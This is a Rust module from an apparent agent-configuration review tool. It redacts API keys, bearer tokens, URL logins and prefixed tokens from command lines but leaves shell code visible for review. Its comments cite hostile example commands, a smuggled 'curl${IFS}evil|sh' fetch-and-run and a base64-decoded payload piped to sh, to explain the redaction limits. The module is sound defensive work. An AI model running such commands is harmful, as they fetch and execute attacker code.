//! Taking secrets out of what an agent's entry starts before it becomes an
//! item's text: a command line is where a token is written when it is not
//! in a variable (`"apiKeyHelper": "echo sk-ant-…"`, `--api-key …`, a header
//! for `curl`). What is taken out is hidden from the local rules and the AI
//! alike, and a payload hidden in it would go unread, so only what can be
//! nothing but a value is: a run of token characters (see
//! `is_token_shaped`), never a word with a shell character in it, never a
//! path or an expansion (`$TOKEN`), which are what a review needs to see.
//!
//! A token is told by its look only where it starts as a known kind of
//! token does (see `masked_tokens`).
//!
//! Not covered, and sent as written: a secret in a header other than
//! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
//! after a flag named for authorization rather than a secret
//! (`--authorization v`), and a quoted value of several words.

use crate::rules::RUNNER_VALUE_FLAGS;
use crate::sweep::judge::secrets::{REDACTED, is_secret_name, without_secrets};

/// The beginnings of tokens that say what they are by themselves: Anthropic
/// and `OpenAI` keys, GitHub, GitLab, Slack, AWS, Google, npm and `PyPI` tokens.
const TOKEN_PREFIXES: &[&str] = &[
    "sk-",
    "sk_live_",
    "sk_test_",
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "github_pat_",
    "glpat-",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxs-",
    "AKIA",
    "ASIA",
    "AIza",
    "ya29.",
    "npm_",
    "pypi-",
];

/// The shortest word with a token's beginning that is taken for one.
/// Arbitrary: shorter than any real token, longer than a flag such as
/// `sk-learn`.
const MIN_PREFIXED_TOKEN: usize = 16;

/// What the word before asked of the next one.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Next {
    /// Nothing.
    Word,
    /// It is the value of a flag or header named for a secret.
    Value,
    /// It is the program a command runs, a prefix such as `sudo`, or an
    /// assignment before them.
    Program,
    /// It is a flag of a prefix, an assignment, or the program after it.
    PrefixArgs(Prefix),
    /// It is the value of a flag of a prefix (`sudo -u build`).
    PrefixValue(Prefix),
    /// It is the verb after `pipx`.
    PipxVerb,
    /// It is the package `npx` or `bunx` runs, or a flag before it.
    NpmPackage,
    /// It is the value of npm's `-p` or `--package`: a package.
    NpmPackageValue,
    /// It is the package `uvx` or `pipx run` runs, or a flag before it.
    UvPackage,
    /// It is the value of `--from` or `--spec`: a package.
    UvPackageValue,
    /// It is the value of another flag before such a package
    /// (`--python 3.12`).
    UvFlagValue,
}

impl Next {
    /// Whether the word is a package a runner fetches: never taken out by
    /// its look, since it is what runs and what the review must see.
    fn is_package(self) -> bool {
        matches!(
            self,
            Self::NpmPackage | Self::NpmPackageValue | Self::UvPackage | Self::UvPackageValue
        )
    }
}

/// A program that runs the program after its own flags.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Prefix {
    Sudo,
    Env,
    Nice,
    Xargs,
    Time,
    /// `exec`, `nohup`, `command`: no flag of theirs takes a value.
    Plain,
}

impl Prefix {
    fn of(program: &str) -> Option<Self> {
        match program {
            "sudo" => Some(Self::Sudo),
            "env" => Some(Self::Env),
            "nice" => Some(Self::Nice),
            "xargs" => Some(Self::Xargs),
            "time" => Some(Self::Time),
            "exec" | "nohup" | "command" => Some(Self::Plain),
            _ => None,
        }
    }

    /// The flags that take the next word as their value, from sudo(8) at
    /// sudo.ws, and env(1), nice(1), xargs(1) and time(1) of the Linux man
    /// pages (checked 2026-10-26). A flag with an optional value written
    /// onto it (`xargs -i`, `-l`, `-e`) takes none.
    fn value_flags(self) -> &'static [&'static str] {
        match self {
            Self::Sudo => &[
                "-a",
                "--auth-type",
                "-C",
                "--close-from",
                "-c",
                "--login-class",
                "-D",
                "--chdir",
                "-g",
                "--group",
                "-h",
                "--host",
                "-p",
                "--prompt",
                "-R",
                "--chroot",
                "-r",
                "--role",
                "-t",
                "--type",
                "-T",
                "--command-timeout",
                "-U",
                "--other-user",
                "-u",
                "--user",
            ],
            Self::Env => &[
                "-a",
                "--argv0",
                "-u",
                "--unset",
                "-C",
                "--chdir",
                "-S",
                "--split-string",
            ],
            Self::Nice => &["-n", "--adjustment"],
            Self::Xargs => &[
                "-a",
                "--arg-file",
                "-d",
                "--delimiter",
                "-E",
                "-I",
                "-L",
                "-n",
                "--max-args",
                "-P",
                "--max-procs",
                "-s",
                "--max-chars",
            ],
            Self::Time => &["-f", "--format", "-o", "--output"],
            Self::Plain => &[],
        }
    }
}

/// `line` with the secrets in it taken out, as `REDACTED`:
///
/// - who an address logs in as (`scheme://user:password@`, the whole of it);
/// - the value of an `Authorization:` header, after its scheme where it has
///   one (`Bearer`, `token`), and the word after `Bearer` or `Basic`;
/// - the value of `NAME=value` where a name before an `=` is named for a
///   secret (`GITHUB_TOKEN=x`, `--env=API_KEY=x`, `--token=x`);
/// - the word after a flag named for a secret (`--api-key x`);
/// - a token by its look, inside any word (see `masked_tokens`), but for
///   the package `npx` and the like run;
/// - what the review's own removal takes out (`export API_KEY=…`).
///
/// Each only where it is token-shaped. The line is read word by word, as
/// blanks split it; quotes around a word stay where they are.
pub(super) fn redacted(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut next = Next::Program;
    let mut word_start = None;
    for (index, character) in line.char_indices() {
        match (character.is_whitespace(), word_start) {
            (true, Some(start)) => {
                out.push_str(&redacted_word(&line[start..index], &mut next));
                out.push(character);
                word_start = None;
            }
            (true, None) => out.push(character),
            (false, None) => word_start = Some(index),
            (false, Some(_)) => {}
        }
    }
    if let Some(start) = word_start {
        out.push_str(&redacted_word(&line[start..], &mut next));
    }
    // The review's own removal too, so what is shown and saved is what is
    // sent (`export API_KEY=…; cmd`).
    without_secrets(&out)
}

/// One word of a line, with what the word before asked of it.
fn redacted_word(word: &str, next: &mut Next) -> String {
    let quotes: &[char] = &['"', '\''];
    let core = word.trim_matches(quotes);
    if core.is_empty() {
        return word.to_string();
    }
    let at = word.len() - word.trim_start_matches(quotes).len();
    let (before, after) = (&word[..at], &word[at + core.len()..]);
    let asked = std::mem::replace(next, Next::Word);
    let written = core;
    let lower = core.to_ascii_lowercase();
    let core = if matches!(lower.as_str(), "bearer" | "basic")
        || (asked == Next::Value && is_auth_scheme(&lower))
        || lower.ends_with("authorization:")
    {
        *next = Next::Value;
        core.to_string()
    } else if asked == Next::Value {
        value(core).to_string()
    } else if let Some((header, rest)) = lower
        .split_once("authorization:")
        .filter(|(_, rest)| !rest.is_empty())
    {
        let name_end = header.len() + "authorization:".len();
        if is_auth_scheme(rest) {
            *next = Next::Value;
            core.to_string()
        } else {
            format!("{}{}", &core[..name_end], value(&core[name_end..]))
        }
    } else {
        let core = without_login(core);
        if core.starts_with('-') && !core.contains('=') && is_secret_name(&core) {
            *next = Next::Value;
            core
        } else {
            without_assigned_secret(&core).unwrap_or(core)
        }
    };
    let core = if asked.is_package() {
        core
    } else {
        masked_tokens(&core)
    };
    if *next == Next::Word {
        *next = following(asked, written);
    }
    format!("{before}{core}{after}")
}

/// What the word `word`, itself what `asked` says, makes of the next one.
/// Flags and programs are told apart in their case (`xargs -I`, `-i`).
/// A shell separator leads to a program. A prefix (`sudo`, `env`) leads
/// to its flags, the values of those, assignments and then the program.
/// `npx` and `bunx` lead to the package they run, also as the value of
/// `-p` or `--package`; `uvx` and `pipx run` to theirs, also as the value
/// of `--from` or `--spec`, past the values of their other flags.
fn following(asked: Next, word: &str) -> Next {
    if word.ends_with([';', '|', '&']) {
        return Next::Program;
    }
    let flag = word.starts_with('-');
    match asked {
        Next::Program | Next::PrefixArgs(_) if !flag && word.contains('=') => asked,
        Next::PrefixArgs(prefix) if flag => {
            if prefix.value_flags().contains(&word) {
                Next::PrefixValue(prefix)
            } else {
                Next::PrefixArgs(prefix)
            }
        }
        Next::PrefixValue(prefix) => Next::PrefixArgs(prefix),
        Next::Program | Next::PrefixArgs(_) => {
            program_word(word.rsplit('/').next().unwrap_or(word))
        }
        Next::PipxVerb if word == "run" => Next::UvPackage,
        Next::NpmPackage if matches!(word, "-p" | "--package") => Next::NpmPackageValue,
        Next::NpmPackage if flag => Next::NpmPackage,
        Next::NpmPackageValue => Next::NpmPackage,
        Next::UvPackage if matches!(word, "--from" | "--spec") => Next::UvPackageValue,
        Next::UvPackage if RUNNER_VALUE_FLAGS.contains(&word) => Next::UvFlagValue,
        Next::UvPackage if flag => Next::UvPackage,
        Next::UvPackageValue | Next::UvFlagValue => Next::UvPackage,
        Next::Word | Next::Value | Next::PipxVerb | Next::NpmPackage | Next::UvPackage => {
            Next::Word
        }
    }
}

/// What the program `program` makes of the word after it.
fn program_word(program: &str) -> Next {
    match program {
        "npx" | "bunx" => Next::NpmPackage,
        "uvx" => Next::UvPackage,
        "pipx" => Next::PipxVerb,
        other => Prefix::of(other).map_or(Next::Word, Next::PrefixArgs),
    }
}

/// Whether `lower` is the scheme of an `Authorization` header, which says
/// what kind the value after it is (`Bearer x`, `token x`).
fn is_auth_scheme(lower: &str) -> bool {
    matches!(lower, "bearer" | "basic" | "token" | "digest")
}

/// Whether `word` can be nothing but a value: token characters only
/// (letters, digits and `._~%+=:/-_`), and not a path or an expansion.
/// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
/// code, and taking it out would hide it from the review.
fn is_token_shaped(word: &str) -> bool {
    !word.is_empty()
        && !word.starts_with(['$', '/', '~', '.'])
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._~%+=:/-_".contains(c))
}

/// `word` as the value of something named for a secret: taken out where it
/// is token-shaped, else as written.
fn value(word: &str) -> &str {
    if is_token_shaped(word) {
        REDACTED
    } else {
        word
    }
}

/// `word` with the value after the first name before an `=` that is named
/// for a secret taken out (`--env=API_KEY=x`); `None` where no such name
/// is in it.
fn without_assigned_secret(word: &str) -> Option<String> {
    let mut name_end = 0;
    for part in word.split('=') {
        let value_start = name_end + part.len() + 1;
        if value_start > word.len() {
            break;
        }
        if is_secret_name(part) {
            return Some(format!(
                "{}={}",
                &word[..value_start - 1],
                value(&word[value_start..])
            ));
        }
        name_end = value_start;
    }
    None
}

/// `word` with who each address in it logs in as taken out, where that is
/// token-shaped: `git+https://ghp_x@github.com/r` is
/// `git+https://github.com/r`.
pub(super) fn without_login(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    let mut rest = word;
    while let Some(at) = rest.find("://") {
        let (before, after) = rest.split_at(at + 3);
        out.push_str(before);
        let end = after
            .find(|c: char| matches!(c, '/' | '?' | '#' | '"' | '\'') || c.is_whitespace())
            .unwrap_or(after.len());
        let authority = &after[..end];
        out.push_str(
            authority
                .rsplit_once('@')
                .filter(|(login, _)| is_token_shaped(login))
                .map_or(authority, |(_, host)| host),
        );
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}

/// `word` with each token in it by its look taken out: each longest run of
/// letters, digits, `_`, `.` and `-` that starts with one of
/// `TOKEN_PREFIXES` and is at least `MIN_PREFIXED_TOKEN` long. What is
/// around it stays (`$(echo sk-…)`, `--key=sk-…;`).
///
/// Only a known prefix tells a token by its look. A long run of mixed case
/// and digits is no sign: a base64 payload looks the same
/// (`echo <base64> | base64 -d | sh`), and taking it out would hide code
/// from the review.
fn masked_tokens(word: &str) -> String {
    let is_token_character = |c: char| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-');
    let mut out = String::with_capacity(word.len());
    let mut rest = word;
    while let Some(start) = rest.find(is_token_character) {
        out.push_str(&rest[..start]);
        let run = &rest[start..];
        let end = run
            .find(|c: char| !is_token_character(c))
            .unwrap_or(run.len());
        let candidate = &run[..end];
        let token = candidate.len() >= MIN_PREFIXED_TOKEN
            && TOKEN_PREFIXES
                .iter()
                .any(|prefix| candidate.starts_with(prefix));
        out.push_str(if token { REDACTED } else { candidate });
        rest = &run[end..];
    }
    out.push_str(rest);
    out
}
